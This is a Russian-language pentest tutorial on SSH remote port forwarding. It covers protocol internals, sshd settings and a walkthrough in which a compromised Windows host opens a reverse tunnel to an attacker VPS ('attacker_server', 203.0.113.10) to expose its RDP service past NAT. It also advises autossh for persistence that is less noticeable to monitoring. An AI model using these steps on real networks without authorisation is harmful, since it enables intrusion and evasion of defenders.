# SSH Remote Port Forwarding: Механизмы, Архитектура и Применение в Тестировании на проникновение

## Контекст и базовые понятия

SSH Remote Port Forwarding (удаленный проброс портов) — это механизм протокола SSH, позволяющий слушателю на удаленном сервере (SSH-серверу) принимать соединения и перенаправлять их через зашифрованный туннель обратно к клиенту, инициировавшему соединение. В контексте тестирования на проникновение и горизонтального перемещения эта технология является критическим инструментом для обхода сетевых ограничений, таких как NAT (Network Address Translation), межсетевые экраны (firewalls) и правила доступа по умолчанию (deny-by-default).

Основное назначение SSH-туннелирования — инкапсуляция произвольных сетевых потоков внутри защищенного SSH-канала. Стандартное поведение SSH-клиента заключается в предоставлении интерактивной оболочки (shell) на удаленной машине. Однако, используя опции проброса портов, SSH-клиент может создавать дополнительные логические каналы внутри сессии. Remote Port Forwarding (обозначаемый флагом `-R`) меняет направление потока данных: клиент (жертва или скомпрометированная машина) инициирует соединение с сервером (контроллером атакующего или VPS), и сервер открывает сокет-слушатель, который перенаправляет входящие пакеты обратно клиенту.

Ключевое разграничение необходимо провести между тремя типами проброса портов в OpenSSH, так как они часто путаются из-за схожего синтаксиса, но имеют принципиально разную семантику в модели OSI и прикладном уровне.

| Характеристика | Local Port Forwarding (`-L`) | Remote Port Forwarding (`-R`) | Dynamic Port Forwarding (`-D`) |
| :--- | :--- | :--- | :--- |
| **Инициатор** | Клиент (локальная машина) | Клиент (локальная машина) | Клиент (локальная машина) |
| **Направление потока** | Локальный порт → Удаленный хост/порт | Удаленный порт → Локальный хост/порт | Динамический SOCKS-прокси на локальном порту |
| **Основная цель** | Доступ к удаленным сервисам как к локальным | Доступ к локальным сервисам извне (через сервер) | Проксирование произвольного трафика (SOCKS4/5) |
| **Сетевая роль** | "Вытягивание" сервиса к клиенту | "Выталкивание" сервиса к серверу | Превращение клиента в прозрачный шлюз |
| **Типичный сценарий IR/Pentest** | Доступ к базе данных из изолированной сети | Обход NAT для доступа к RDP/SSH жертвы | Использование скомпрометированной машины как прокси для сканирования внутренней сети |
| **Управление на сервере** | Сервер только перенаправляет трафик | Сервер должен разрешить `GatewayPorts` для внешнего доступа | Сервер не требует специальных настроек для самого туннеля, но требует доступа к порту |

Важно различать **Reverse Tunneling** (обратное туннелирование) и **Reverse Proxy**. Обратное туннелирование создает канал, по которому трафик течет от сервера к клиенту. Reverse Proxy (например, Nginx или HAProxy) — это отдельное приложение, которое принимает соединения и перенаправляет их. SSH `-R` реализует обратное туннелирование на транспортном уровне (L3/L4), не требуя установки дополнительного ПО на сервере, кроме SSH-демона.

В контексте горизонтального перемещения Remote Port Forwarding решает проблему "обратного NAT". Если скомпрометированная машина находится за строгим фаерволом, который блокирует входящие соединения на порт 22 (SSH) или 3389 (RDP), но разрешает исходящие соединения на порт 443 (HTTPS) или 22 (SSH), атакающий может использовать `-R` для создания "моста". Атакующий подключается к этому мосту со своего сервера, и трафик проходит через туннель обратно к жертве, минуя правила входящего доступа.

## Внутреннее устройство предмета

Remote Port Forwarding реализуется на уровне протокола SSH (версии 2 и выше) через механизм каналов (channels). Понимание внутренней структуры требует рассмотрения процесса инициализации, конфигурации демона и сетевого взаимодействия.

### Механизм работы и фазы установления туннеля

Процесс создания обратного туннеля состоит из нескольких строгих этапов, определяемых спецификацией SSH (RFC 4254).

1.  **Инициация соединения:** Клиент (`ssh -R ... user@server`) устанавливает стандартное TCP-соединение с SSH-сервером (обычно порт 22 или 443).
2.  **Аутентификация:** Выполняется стандартный процесс обмена ключами (Diffie-Hellman) и аутентификации пользователя.
3.  **Запрос канала (SSH_MSG_GLOBAL_REQUEST):** После успешной аутентификации клиент отправляет серверу запрос `tcpip-forward`. Этот запрос содержит:
    *   `cancel`: флаг `false` (запрос на создание, а не удаление).
    *   `address`: адрес привязки (по умолчанию `127.0.0.1` или `localhost`).
    *   `port`: порт на стороне сервера, который нужно слушать.
4.  **Проверка политик сервера:** SSH-демон (`sshd`) проверяет конфигурацию:
    *   Разрешен ли `AllowTcpForwarding` (глобально или для пользователя).
    *   Разрешена ли привязка к указанному адресу через `GatewayPorts`.
    *   Если проверка проходит, сервер отвечает `SSH_MSG_REQUEST_SUCCESS`.
5.  **Создание слушателя:** Сервер создает сокет и начинает прослушивать указанный порт. Если `GatewayPorts` отключен, привязка происходит только к `127.0.0.1`. Если включен — к `0.0.0.0` (все интерфейсы).
6.  **Активация туннеля:** При поступлении соединения на этот порт сервер создает новый канал (`SSH_MSG_CHANNEL_OPEN`) обратно к клиенту. Клиент принимает его и связывает с локальным хостом и портом, указанными в аргументе `-R`.

### Конфигурация SSH-демона (sshd_config)

Без правильной конфигурации сервера обратный проброс часто не работает или работает ограниченно. Ключевые директивы в `/etc/ssh/sshd_config`:

*   `AllowTcpForwarding`: По умолчанию `yes`. Если установлено в `no`, все виды проброса портов запрещены.
*   `GatewayPorts`: По умолчанию `no`. Это критический параметр для Remote Forwarding.
    *   `no`: Порт слушается только на loopback-интерфейсе (`127.0.0.1`). Доступен только локально на сервере.
    *   `yes`: Порт слушается на всех интерфейсах (`0.0.0.0`). Доступен извне сети.
    *   `clientspecified`: Клиент может явно указать адрес привязки в команде (например, `-R 0.0.0.0:8080:...`).
*   `PermitOpen`: Ограничивает, к каким хостам и портам клиент может перенаправлять трафик. Если этот параметр настроен, клиент не сможет пробросить трафик на произвольный хост, что является мерой защиты от использования сервера как прокси.
*   `AllowStreamLocalForwarding`: Относится к Unix-domain socket forwarding, но часто настраивается параллельно.

### Архитектура потока данных

```text
[Атакующий / Интервал]          [SSH Server (VPS)]              [Жертва / Клиент]
       |                                |                              |
       |  1. Подключение к порту 8080   |                              |
       +--------------------------------->|                              |
       |  2. TCP SYN (на 0.0.0.0:8080)  |                              |
       |                                |  3. Внутренний перенаправл.   |
       |                                +------------------------------->|
       |                                |     4. Туннель SSH (L4)       |
       |                                |     5. Подключение к localhost |
       |                                |     6. Сервис (напр., RDP)    |
       |                                |                              |
       |  6. Ответ от сервиса <---------+                              |
       |  7. Шифрование и передача <----+                              |
       |                                |                              |
       |  8. Дешифрование и ответ ----->+                              |
       |                                |                              |
       |  9. Данные RDP сессии <--------+                              |
```

В схеме выше, шаг 3 происходит внутри `sshd`. Если `GatewayPorts` равен `no`, шаг 1 невозможен извне, и доступ будет только с самого сервера (`ssh -p 8080 localhost`).

### Ограничения и инварианты

*   **Привязка адреса:** По умолчанию OpenSSH привязывает порт к `127.0.0.1` из соображений безопасности. Это предотвращает случайное экспонирование туннеля в интернет.
*   **Жизненный цикл:** Туннель существует только пока жив процесс SSH-клиента. Если клиент падает или теряет сеть, туннель на сервере закрывается. Для обеспечения устойчивости используются механизмы перезапуска (например, `autossh` или `systemd`).
*   **Пропускная способность:** Туннель наследует пропускную способность SSH-соединения. Шифрование (AES-GCM, ChaCha20) добавляет накладные расходы на CPU, но в современных системах это минимально.
*   **MTU (Maximum Transmission Unit):** Инкапсуляция добавляет заголовки SSH, что может привести к фрагментации пакетов, если MTU сети не настроен корректно. Это может вызывать проблемы с некоторыми протоколами, чувствительными к фрагментации.

## Применение и работа с предметом

На практике SSH Remote Port Forwarding используется в двух основных сценариях: легитимном администрировании удаленных узлов и в тестировании на проникновение для обхода сетевых границ.

### Легитимное использование

Администраторы используют `-R` для доступа к сервисам, находящимся за NAT или корпоративным фаерволом, без настройки правил проброса портов на маршрутизаторе. Например, доступ к веб-интерфейсу IoT-устройства или базе данных, расположенной в защищенной зоне.

Для обеспечения надежности туннеля в продакшене используются следующие паттерны:

1.  **Фоновый режим:** Использование флагов `-f` (background after auth) и `-N` (no remote command) для создания туннеля без интерактивной оболочки.
2.  **Сохранение состояния:** Флаг `-T` (disable pseudo-tty) экономит ресурсы.
3.  **Автоматический перезапуск:** Использование `autossh` или `systemd` для мониторинга соединения и его восстановления при обрыве.

### Применение в тестировании на проникновение

В рамках горизонтального перемещения Remote Port Forwarding позволяет атакующему:

1.  **Обход NAT для доступа к RDP/SSH:** Если жертва находится за NAT, атакующий не может подключиться к ней напрямую. Запуск `ssh -R 3389:localhost:3389` на жертве позволяет атакующему подключиться к своему серверу на порт 3389, и трафик будет перенаправлен на RDP-сервис жертвы.
2.  **Создание "моста" для других инструментов:** После установки туннеля для SSH (порт 22), атакующий может использовать этот же туннель для запуска других инструментов, например, `chisel` или `frp`, для более сложного проксирования.
3.  **Обход ограничений доступа:** Если фаервол блокирует входящие соединения на нестандартные порты, но разрешает SSH (порт 22/443), туннелирование позволяет "спрятать" трафик других сервисов внутри SSH-пакетов.

### Типичные ошибки и подводные камни

*   **Неправильная привязка адреса:** Запуск `ssh -R 8080:localhost:80` без настройки `GatewayPorts yes` на сервере приведет к тому, что туннель будет доступен только локально на сервере. Атакующий, подключаясь с удаленной машины, получит ошибку "Connection refused".
*   **Конфликт портов:** Если на сервере уже занят порт, указанный в `-R`, соединение не установится. Необходимо использовать свободный порт.
*   **Безопасность сервера:** Включение `GatewayPorts yes` делает туннель доступным из интернета. Если сервер скомпрометирован, атакующий может использовать этот туннель для доступа к внутренней сети жертвы.
*   **Логирование:** SSH-демон логирует создание туннелей. В корпоративной среде это может быть обнаружено SOC-аналитиками.

### Команды и конфигурации

Для создания обратного туннеля используется следующая структура команды:

```bash
ssh -f -N -T -R [bind_address:]remote_port:local_host:local_port user@ssh_server
```

*   `-f`: Перейти в фоновый режим после аутентификации.
*   `-N`: Не выполнять удаленную команду (только проброс).
*   `-T`: Отключить распределение псевдо-терминала.
*   `-R`: Указывает на обратный проброс.
*   `bind_address`: Опционально. Если не указан, используется `127.0.0.1`. Для внешнего доступа на сервере должен быть включен `GatewayPorts yes` или указан `0.0.0.0`.

Пример для внешнего доступа (при включенном GatewayPorts):

```bash
ssh -f -N -T -R 0.0.0.0:8080:localhost:80 user@attacker_server
```

Пример для локального доступа на сервере (по умолчанию):

```bash
ssh -f -N -T -R 8080:localhost:80 user@attacker_server
```

## Сквозной практический пример: Обход NAT для доступа к RDP

**Исходные условия:**
*   **Жертва (Client):** Windows 10 Pro, находится за NAT (частная сеть 192.168.1.0/24), SSH-клиент (OpenSSH for Windows) установлен и работает. RDP-сервис запущен на порту 3389.
*   **Сервер (Server):** VPS с Ubuntu 22.04, публичный IP `203.0.113.10`, SSH-демон настроен с `GatewayPorts yes`.
*   **Атакующий:** Работает с локальной машины, подключаясь к VPS.
*   **Цель:** Получить доступ к RDP-сервису жертвы через VPS, минуя NAT жертвы.

### Шаг 1: Настройка SSH-сервера (VPS)

На сервере необходимо убедиться, что `GatewayPorts` разрешен, чтобы туннель был доступен извне.

```bash
# Проверка текущей конфигурации
grep GatewayPorts /etc/ssh/sshd_config

# Если нет, добавить или изменить
echo "GatewayPorts yes" >> /etc/ssh/sshd_config

# Перезапуск SSH-демона
sudo systemctl restart sshd
```

*Ожидаемый вывод:* Команда `grep` может вернуть пустой результат или закомментированную строку. После добавления и перезапуска сервис должен принимать соединения на всех интерфейсах.

### Шаг 2: Создание обратного туннеля на жертве

На скомпрометированной машине Windows запускается SSH-клиент для создания туннеля.

```powershell
# Команда в PowerShell (или CMD)
ssh -f -N -T -R 0.0.0.0:3389:localhost:3389 user@203.0.113.10
```

*Пояснение:*
*   `-f`: Перейти в фон.
*   `-N`: Не открывать оболочку.
*   `-T`: Отключить терминал.
*   `-R 0.0.0.0:3389:localhost:3389`: Слушать на всех интерфейсах сервера на порту 3389 и перенаправлять на localhost:3389 жертвы.
*   `user@203.0.113.10`: Подключение к VPS.

*Ожидаемый вывод:* Команда завершается без вывода (так как используется `-f`). Процесс SSH остается в фоне.

### Шаг 3: Проверка слушателя на сервере

На VPS проверяется, что порт 3389 слушается.

```bash
# Проверка открытых портов
ss -tlnp | grep 3389
```

*Ожидаемый вывод:*
```text
LISTEN 0      128          0.0.0.0:3389       0.0.0.0:*    users:(("sshd",pid=1234,fd=5))
```
Это подтверждает, что SSH-демон на сервере слушает порт 3389 на всех интерфейсах.

### Шаг 4: Подключение к RDP с локальной машины атакующего

Атакующий подключается к VPS на порт 3389, и трафик перенаправляется на RDP жертвы.

```bash
# Использование mstsc (Windows) или xfreerdp (Linux)
# Пример для Linux:
xfreerdp /v:203.0.113.10:3389 /u:admin /p:password
```

*Ожидаемый вывод:* Запускается окно RDP-сессии, отображающее рабочий стол жертвы. Это означает, что туннель работает корректно, и трафик проходит через VPS к внутренней сети жертвы.

### Шаг 5: Диагностика при сбое

Если подключение не устанавливается, проверяются логи на сервере.

```bash
# Просмотр логов SSH-демона
sudo journalctl -u sshd -f | grep "forward"
```

*Ожидаемый вывод (при успешном подключении):*
```text
sshd[1234]: Received request for connection to port 3389.
sshd[1234]: channel 3: new [tcp/ip]
```

*Ожидаемый вывод (при ошибке GatewayPorts):*
```text
sshd[1234]: error: Bind to port 3389 on 0.0.0.0 failed: Address already in use.
# Или
sshd[1234]: error: GatewayPorts is not enabled.
```

**Ожидаемый вывод примера:**
Демонстрируется полный цикл создания обратного туннеля: от настройки сервера до подключения к сервису жертвы. Пример показывает, как SSH Remote Port Forwarding позволяет обойти NAT и фаерволы, делая внутренние сервисы доступными извне через промежуточный узел.

## Аналитический вывод

SSH Remote Port Forwarding представляет собой мощный механизм обхода сетевых ограничений, основанный на инкапсуляции трафика внутри защищенного SSH-канала. В контексте тестирования на проникновение и горизонтального перемещения эта технология позволяет атакующим получать доступ к сервисам, находящимся за NAT или строгими фаерволами, без необходимости прямой сетевой доступности. Ключевым фактором успешного применения является корректная конфигурация SSH-демона на стороне сервера, в частности, параметр `GatewayPorts`, который определяет, будет ли туннель доступен только локально или из внешней сети.

Важно отметить, что использование `-R` оставляет следы в логах SSH-демона и требует наличия SSH-клиента на скомпрометированной машине. В современных корпоративных средах мониторинг создания туннелей и аномальных сетевых соединений может выявить подобные активности. Тем не менее, из-за широкого распространения SSH и его легитимного использования для администрирования, обнаружение таких туннелей требует глубокого анализа контекста и поведения процессов. Для обеспечения устойчивости туннелей в реальных сценариях рекомендуется использовать механизмы автоматического перезапуска, такие как `autossh` или `systemd`, что делает их менее заметными для ручного мониторинга.
